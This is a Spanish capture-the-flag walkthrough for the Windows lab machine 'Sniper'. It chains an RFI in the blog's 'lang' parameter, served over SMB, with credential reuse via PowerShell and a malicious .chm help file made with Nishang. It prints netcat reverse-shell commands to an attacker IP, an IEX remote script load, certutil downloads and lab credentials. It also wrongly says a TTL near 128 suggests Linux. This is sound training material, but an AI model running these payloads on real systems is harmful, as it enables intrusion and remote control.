# Sniper

![](../../../../~gitbook/image.md)Publicado: 12 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Sniper es una máquina Windows de dificultad media que simula el entorno de una empresa de entrega y seguimiento de productos. El vector de ataque inicial se basa en una vulnerabilidad de Remote File Inclusion (RFI) presente en el parámetro `lang` del blog corporativo. Esta vulnerabilidad permite la ejecución remota de código aprovechando un servidor SMB para bypassear las restricciones de inclusión de archivos remotos via HTTP.Una vez obtenido el acceso inicial, se encuentra reutilización de credenciales que permite el movimiento lateral al usuario `Chris`. La escalada de privilegios se logra mediante la creación de un archivo malicioso `.chm` (Compiled HTML Help) que es procesado automáticamente por el administrador del sistema, resultando en la ejecución de código con privilegios elevados.Esta máquina destaca por enseñar técnicas avanzadas de explotación como el uso de servidores SMB para RFI y la creación de payloads maliciosos en archivos de ayuda de Windows.
###🎯 Objetivos
- User Flag: Acceso como usuario `Chris`
- Root Flag: Escalada de privilegios a `Administrator`

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios

####445 TCP -SMB
Descartamos que podamos enumerar algún recurso compartido mediante una null session:![](../../../../~gitbook/image.md)
####80 TCP - HTTP (Sniper CO)
Al acceder al servicio web en http://10.10.10.151/ encontramos una empresa dedicada a la entrega y seguimiento de productos.![](../../../../~gitbook/image.md)🔐 Panel de LoginHay un panel de login en el que las credenciales por defecto no parecen funcionar pero vemos una opción de registro:![](../../../../~gitbook/image.md)Nos registramos pero al acceder no encontramos más que un sitio web que está en construcción:![[33.png]]📰 Bloghttp://10.10.10.151/blog/index.phpEn este apartado encontramostexto del blog es solo un párrafo sobre plazos de entrega rápidos y texto ficticio de Lorem Ipsum . Pero hay una barra de opciones en la parte superior.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)La mayoría de los enlaces solo dirigen a esta página, pero el menú desplegable de idiomas incluye enlaces a:- `http://10.10.10.151/blog?lang=blog-en.php`
- `http://10.10.10.151/blog?lang=blog-es.php`
- `http://10.10.10.151/blog?lang=blog-fr.php`
Es probable que la página haga algo como tener cada una de las tres páginas de idioma en el mismo directorio y luego tener PHP que las incluya:Si el filtrado previo no es adecuado, podría existir una vulnerabilidad de inclusión de archivos. Lo anotamos pare revisarlo posteriormente.Fuzzing de directoriosRealizamos fuzzing de directorios sobre este servicio pero no encontramos ningún recurso que nos sirva como vía potencial de ataque:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
####🎯 Explotación Inicial
Verificando Local File Inclusion (LFI)En la sección de blog habíamos visto que hay una posible inclusión de archivo local en el parámetro `lang`. No funciona cuando intento incluir algo con una ruta relativa, como `..\index.php`.Pero si uso una ruta absoluta, como `\windows\win.ini`, la página se carga y puedo ver el archivo en el contenido en la parte inferior si miro la fuente:![](../../../../~gitbook/image.md)Otra cosa que podríamos hacer es intentar leer un recurso del sistema usando un wrapper y codificación en base64 de la siguiente forma:Pero tampoco parece funcionar en este caso.![](../../../../~gitbook/image.md)Verificando Remote File Inclusion (RFI)Creamos un archivo php y levantamos un servidor web con python en nuestro host de ataque:A continuación referenciamos este archivo usando el parámetro lang de la petición:Pero parece estar bloqueando RFI:![](../../../../~gitbook/image.md)Algunas veces, los sitios web a pesar de tener este tipo de acciones, suelen prevenir acciones maliciosas usando algunas validaciones internas, como eliminar caracteres de una entrada o simplemente rechazarla si esta parece tener un carácter malicioso.Sin embargo, aquí nos apoyaremos en una técnica que se explica en el siguiente documento: [http://www.mannulinux.org/2019/05/exploiting-rfi-in.php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in.php-bypass-remote-url-inclusion-restriction.html)y que consiste en usar un método alternativo para un RFI y es usar SMB para hospedar un script malicioso en lugar de un servidor web. Así que procedemos a crear un archivo malicioso o que ejecute alguna orden en el sistema, marcamos la ubicación del archivo como sin grupo y sin usuario y le asignamos permisos de lectura/ejecución a la carpeta. Luego de ello vamos a modificar nuestro smb para que pueda compartir el archivo.
####🚀 RFI usando SMB Server
Iniciamos un servidor smb usando impacket:Ahora intento referenciar un recurso que no exista accediente a dicho servidorhttp://10.10.10.151/blog/?lang=//10.10.14.7/smbShare/testY comprobamos que hay autenticación desde el user SNIPER a nuestro servidor SMB, luego podemos abusar de esta vulnerabilidad de tipo RFI![](../../../../~gitbook/image.md)Para llevar a cabo esta explotación, seguimos los siguientes pasos:Creamos un directorio llamado `share`y dentro un archivo .php que ejecutará una llamada al sistema para listar directorios:Asignamos los permisos necesariosA continuación, abrimos el archivo de configuración smbd.conf sobre el que debemos definir la siguiente configuración en global y el nuevo recurso compartido que creemos, en este caso "sniper"Reiniciamos el demonio smbd para que tenga efecto la configuraciónPodemos probar si funciona la configuración de manera local usando smbclient para listar y conectarnos al recurso:![](../../../../~gitbook/image.md)Si tenemos algún problema de permisos, aplicaremos los siguientes permisos al resto del path:Si probamos a acceder al recurso compartido haciendo una petición desde el navegador veremos que nos lista correctamente el contenido del directorio de la máquina windowshttp://10.10.10.151/blog/?lang=\10.10.14.7\sniper\shell.php![](../../../../~gitbook/image.md)
####💻 Acceso Inicial - RFI → RCE
El objetivo ahora es transformar este RFI en un RCE. Para ello, podemos descargar y copiar netcat en el directorio share y lo usaremos para establecer una conexión reversa. Para esto debemos también cambiar el contenido de nuestro fichero shell.php para que en lugar de usar la función shell_exec para realizar un listado del directorio, usemos netcat quedando de la siguiente forma:![](../../../../~gitbook/image.md)Iniciamos un listener con netcat en nuestro host de ataque que será donde recibiremos la conexión:Y ahora solo nos quedaría volver a realizar la petición al fichero shell.php del recurso compartido sniper:![](../../../../~gitbook/image.md)👥 Enumeración de usuariosParece que no tenemos permisos para listar el directorio de ninguno de los usuarios de la máquina.🔑 Revisando archivos fuentes del sitio webAl revisar el código fuente del sitio web encontramos un archivo llamad db.php y al revisar el contenido vemos unas credenciales:![](../../../../~gitbook/image.md)`dbuser:36mEAhz/B8xQ~2VM`↔️ Movimiento LateralConfirmamos que la contraseña está siendo reutilizada en otro servicio y por otros usuarios:![](../../../../~gitbook/image.md)Listamos recursos compartidos y no vemos ningún recurso en el que tengamos permiso de escritura para el usuario chris, por lo que no podemos autenticarnos en la máquina usando psexec.![](../../../../~gitbook/image.md)Intento usar runas para tratar de lanzar comandos como este usuario dentro de la máquina pero tampoco parece funcionar:![](../../../../~gitbook/image.md)Otra alternativa que podemos probar es usar powershell y objeto PSCredential y probar a ejecutando el comando "whoami"Comprobamos que funciona:![](../../../../~gitbook/image.md)Podemos ahora usar este comando para que en lugar de "whoami" ejecute una reverse shell. Reutlizamos en este caso la reverse shell que teníamos en el recurso compartido SNIPER de la siguiente forma:![](../../../../~gitbook/image.md)Logramos movernos lateralmente y ganar acceso como usuario Chris y obtenemos la primera flag en el directorio Desktop de su usuario:![](../../../../~gitbook/image.md)
####🚀 Escalada de Privilegios
Enumerando la máquina encontramos un directorio en `C:\Docs` en cuyo interior hay un archivo de texto con la siguiente información:Al principio no parece ser de gran utilidad, pero continuamos enumerando la máquina y encontramos un archivo llamado `instructions.chm` en el directorio del usuario Chris:
####📘 ¿Qué es un archivo .chm?
Es un archivo de ayuda compilado que contiene:- Páginas HTML.
- Archivos multimedia (imágenes, CSS, etc.).
- Un índice y tabla de contenido.
- Un motor de búsqueda interno.
Estos archivos son comúnmente usados para la documentación de software en Windows.Si intentamos atar cabos, puede que este archivo sea lo que está esperando el CEO que deposite en el directorio C:\Docs. Buscando información encontramos que este tipo de archivo es una vía potencial para la inyección de código maliciosoEn este post encontramos información interesante sobre cómo llevar a cabo esto:https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7?permalink_comment_id=3753666![](../../../../~gitbook/image.md)Explotación de archivo malicioso chm para escalar privilegiosHay una utilidad en powershell que de [NIshang](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) que nos permite hacer esto de una forma sencilla siguiendo los siguientes pasos:Paso 1Primero necesitamos descargar la herramienta [HTML Help Workshop](https://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe) en una máquina virtual con windows. Ppdemos hacerlo desde aquí:Paso 2Ahora desde la máquina virtual windows, usamos el siguiente cmdlet para cargar el en memoria el script de powershell de nishang y ejecutarlo referenciando el path de la herramienta htlmlhelp:NOTA: Es posible que lo detecte como malicioso y tengamos que deshabilitar previamente el antivirus en nuestra máquina virtual windowsPaso 3Ahora, usaremos la siguiente función precargada del script anterior:Pero en lugar de un Get-Procees, nos interesa generar un documento malicioso que contenga una reverse shell, así que lo hacemos de nuevo referenciando a nuestro recurso SMB compartido y usando netcat de la siguiente forma:Una vez ejecutado el comando vemos que se ha generado el archivo malicioso doc.chm.![](../../../../~gitbook/image.md)Paso 4Ahora, deberemos transferir el archivo malicioso a nuestro host de ataque para desde ahí subirlo al directorio C:\Docs de la máquina Sniper, ya que se supone que de ahí es donde lo debe coger el CEO o administrador.Una forma de transferir esto rápidamente, cuando se trata de archivos pequeños, es codificarlo en base64. Desde windows podemos hacerlo de la siguiente forma:![](../../../../~gitbook/image.md)Este sería el contenido del archivoCopiamos el contenido en base 64 y en nuestro host de linux lo decodificamos y lo convertimos de la siguiente forma:Verificamos el tipo de archivo:
####Paso 5
Iniciamos un nuevo listener en nuestro host de ataque donde recibiremos la nueva reverse shell como administrador:Ahora, transferimos al directorio C:\Docs el archivo malicioso doc.chm y netcat al directorio C:\Users\Chris\Desktop:Cuando el administrador abre el archivo con extensión .chm del directorio C:\Docs, recibimos la reverse shell y ya podemos obtener la última flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🎯 Objetivos](#objetivos)
- [🔭 Reconocimiento](#reconocimiento)

```
❯ ping -c2 10.10.10.151
PING 10.10.10.151 (10.10.10.151) 56(84) bytes of data.
64 bytes from 10.10.10.151: icmp_seq=2 ttl=127 time=53.0 ms

--- 10.10.10.151 ping statistics ---
2 packets transmitted, 1 received, 50% packet loss, time 1012ms
rtt min/avg/max/mdev = 53.021/53.021/53.021/0.000 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.151 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
80,135,139,445,49667
```

```
❯ nmap -sC -sV -p$ports 10.10.10.151 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 11:07 CEST
Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
Nmap scan report for 10.10.10.151
Host is up (0.048s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-12T16:09:58
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 7h01m48s

```

```
include $_GET['lang'];
```

```
dirsearch -u http://10.10.10.151 -x 503,404
```

```
gobuster dir -e --url http://10.10.10.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80
```

```
/windows/system32/drivers/etc/hosts
```

```
php://filter/convert.base64-encode/resource=\inetpub\wwwroot\index.php
```

```
echo "" >> wwwshell.php
python3 -m http.server 8000
```

```
http://10.10.10.151/blog/?lang=http://10.10.14.7:8000/wwwshell.php
```

```
impacket-smbserver smbShare $(pwd) -smb2support
```

```
mkdir share
cd share
nano shell.php
```

```

```

```
chmod 0555 share/
chown -R nobody:nogroup share/
```

```
nano /etc/samba/smbd.conf
```

```
[global]
workgroup = WORKGROUP
server string = Samba Server
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[sniper]
path = /home//SNIPER/share
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
acl allow execute always = yes
```

```
service smbd restart
```

```
smbclient  \\\\10.10.14.7\\sniper -N
```

```
chmod o+x /home
chmod o+x /home/
chmod o+x /home//SNIPER
```

```

```

```
nc -nlvp 443
```

```
http://10.10.10.151/blog/?lang=\\10.10.14.7\sniper\shell.php
```

```
Directory of C:\Users

04/11/2019  07:04 AM              .
04/11/2019  07:04 AM              ..
04/09/2019  06:47 AM              Administrator
04/11/2019  07:04 AM              Chris
04/09/2019  06:47 AM              Public
0 File(s)              0 bytes
5 Dir(s)   2,263,588,864 bytes free
C:\Users>cd Chris
cd Chris
Access is denied.

C:\Users>cd Administrator
cd Administrator
Access is denied.

C:\Users>cd Public
cd Public
Access is denied.
```

```
netexec smb 10.10.10.151 -u 'chris' -p '36mEAhz/B8xQ~2VM'
```

```
runas /user:chris "cmd.exe /c whoami"
```

```
powershell -ep bypass

$user = 'WORKGROUP\Chris'
$pass = '36mEAhz/B8xQ~2VM'
Invoke-Command -ScriptBlock { whoami } -ComputerName SNIPER -Credential (New-Object System.Management.Automation.PSCredential $user, (ConvertTo-SecureString $pass -AsPlainText -Force))

```

```
nc -nlvp 443
```

```
Invoke-Command -ScriptBlock { \\10.10.14.7\\sniper\\nc.exe 10.10.14.7 443 -e cmd.exe } -ComputerName SNIPER -Credential (New-Object System.Management.Automation.PSCredential $user, (ConvertTo-SecureString $pass -AsPlainText -Force))
```

```
Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```

```
C:\Users\Chris\Downloads>dir
dir
Volume in drive C has no label.
Volume Serial Number is AE98-73A8

Directory of C:\Users\Chris\Downloads

04/11/2019  08:36 AM              .
04/11/2019  08:36 AM              ..
04/11/2019  08:36 AM            10,462 instructions.chm
1 File(s)         10,462 bytes
2 Dir(s)   2,262,171,648 bytes free
```

```
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Client/Out-CHM.ps1')
```

```
Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

```
Out-CHM -Payload "C:\Users\chris\Desktop nc.exe -e cmd 10.10.14.7 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

```
$InputFile = "C:\Users\vboxuser\Desktop\doc.chm"
$Base64File = "C:\Users\vboxuser\Desktop\doc.b64"

[Convert]::ToBase64String([IO.File]::ReadAllBytes($InputFile)) | Out-File -Encoding ASCII $Base64File
```

```
SVRTRgMAAABgAAAAAQAAAFsjfYsKDAAAEP0BfKp70BGeDACgySLm7BH9AXyqe9ARngwAoMki5uxgAAAAAAAAABgAAAAAAAAAeAAAAAAAAABUEAAAAAAAAMwQAAAAAAAA/gEAAAAAAACCNAAAAAAAAAAAAAAAAAAASVRTUAEAAABUAAAACgAAAAAQAAACAAAAAQAAAP////8AAAAAAAAAAP////8BAAAACQQAAGqSAl0uIdARnfkAoMki5uxUAAAA////////////////UE1HTCkNAAAAAAAA//////////8BLwAAAAgvI0lEWEhEUgH8HaAACC8jSVRCSVRTAAAACS8jU1RSSU5HUwGBnHc2CC8jU1lTVEVNAIEGoQIILyNUT1BJQ1MBgZwdIAgvI1VSTFNUUgGBnFUiCC8jVVJMVEJMAYGcPRgLLyRGSWZ0aU1haW4BAAAJLyRPQkpJTlNUAecClRsVLyRXV0Fzc29jaWF0aXZlTGlua3MvAAAAHS8kV1dBc3NvY2lhdGl2ZUxpbmtzL1Byb3BlcnR5AeZ+BBEvJFdXS2V5d29yZExpbmtzLwAAABkvJFdXS2V5d29yZExpbmtzL1Byb3BlcnR5AeZ6BAgvZG9jLmhoYwEAhmAIL2RvYy5odG0BhmCxTgkvZG9jMS5odG0BuC6uTBQ6OkRhdGFTcGFjZS9OYW1lTGlzdAAAPCg6OkRhdGFTcGFjZS9TdG9yYWdlL01TQ29tcHJlc3NlZC9Db250ZW50AKIIpH4sOjpEYXRhU3BhY2UvU3RvcmFnZS9NU0NvbXByZXNzZWQvQ29udHJvbERhdGEAahwpOjpEYXRhU3BhY2UvU3RvcmFnZS9NU0NvbXByZXNzZWQvU3BhbkluZm8

.
.
.
.

AYggvOjpEYXRhU3BhY2UvU3RvcmFnZS9NU0NvbXByZXNzZWQvVHJhbnNmb3JtL0xpc3QAPCZfOjpEYXRhU3BhY2UvU3RvcmFnZS9NU0NvbXByZXNzZWQvVHJhbnNmb3JtL3s3RkMyODk0MC05RDMxLTExRDAtOUIyNy0wMEEwQzkxRTlDN0N9L0luc3RhbmNlRGF0YS8AAABpOjpEYXRhU3BhY2UvU3RvcmFnZS9NU0NvbXByZXH9/BcHmU727LPbS0+b7xyGzrikU67ReijfdQ7DlGO7MQim9+PdtmkWfrAujKlZ1Zcs82kZ18c0024XJ/N72fgT1y4cRQvvdxL3XFVV+Nyfvq4nzrkoY4jR/XU6zkk12yzg/Tak4U2/hatt07vq1PU6r1yWGeWo/jjHPXTvsu0zeXMhwpz39Fl7uyJq/Tsmg47+vR3XaNc65v1+uYctdW5XAfcmlWfPirTO5f1ab03Ju+eQzbb487an7X2Bh222+io9Wsd9d0WKLfs6AwWK5wSgy6Xb5PU27t04o6mozfcHQWGPaPCsaiUWDZ1IkuqjmPH1VFs2TqqNcvimuqPnYyebaPO3K41934dueXsKE03R9Ha8CptGzuiRfAQl13LZeryOzuxZdZHd90dVaqlo9S3+Nlta0fuuz/q4o7R7v71F7y7f2dugpkm+tyOvyFRUAhs2s63oFH2njBptJaML11u730m2+Nfx9Rlb2jLMTvun2t2877dcj/dr4PcAwMDAwMDAwMDAwMDAwP7fb9/UuHa4PWgwjtg93y5vSOdpi17D0reX3111Z/ys+X//e1Gp+c7+v+cDf4XCt59gWCQYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYG1ggPACAAAAAQAAAAgAAAAoAAAArU4AAAAAAAB+EgAAAAAAAACAAAAAAAAAAAAAAAAAAAA=

```

```
echo "d3jqEVa1dncRcrStd7lDZ3g1zIGfy8j40pHWsErhu2/S3eLoBud1/KExGhGqguu1iWqy0mXisuYh1mi0HZOphgjPpQ0qRskzdLVfp6x1HVmhTiZIjb50LehTOuJjiTwYrWqiraA9d41K44Jp4dSbFC/HO4pZfc7lp

.
.

LYjCGl9+9+RVUM4at7j2s6iTUSTAtgRr9ouJhQucS39jektJQ3cWPWjqIunsUjz3VNnt/qnjogUJ0aEnM4KEpJDJqSJQFH0mgyPfE68zej0xgx6kOL6WO9nVguOUbw3Spa2t33NsNrb9xjx4VsYMkvR4Rc54vwxA3l06jKxkgjmZ/qaTxn1D5Up57jXMyBusZ2s7l7ZQJ9mhoxdurs5ODofum7kIVhpQM9biQVgOhGTQ2IOySPIUcpN/RwDJV+8rDoFmNvyr5Sx76VjwngckNeqNoTQhN2iuIbqjg3VfBzUqcbpTaoqp49nmDZuMKwfG9Sbm8ppqHFBdbjx8tBAqsQq6scEprNYchZEqt5xcXq4rHi8Sr25Hns8sz7OlNNJ+wKrK8kp7phUvmJRaEJSfS" | base64 -d > doc.chm
```

```
file doc.chm
doc.chm: MS Windows HtmlHelp Data
```

```
nc -nlvp 443
```

```
python3 -m http.server 80
```

```
certutil -urlcache -split -f http://10.10.14.7/nc.exe
certutil -urlcache -split -f http://10.10.14.7/doc.chm
```
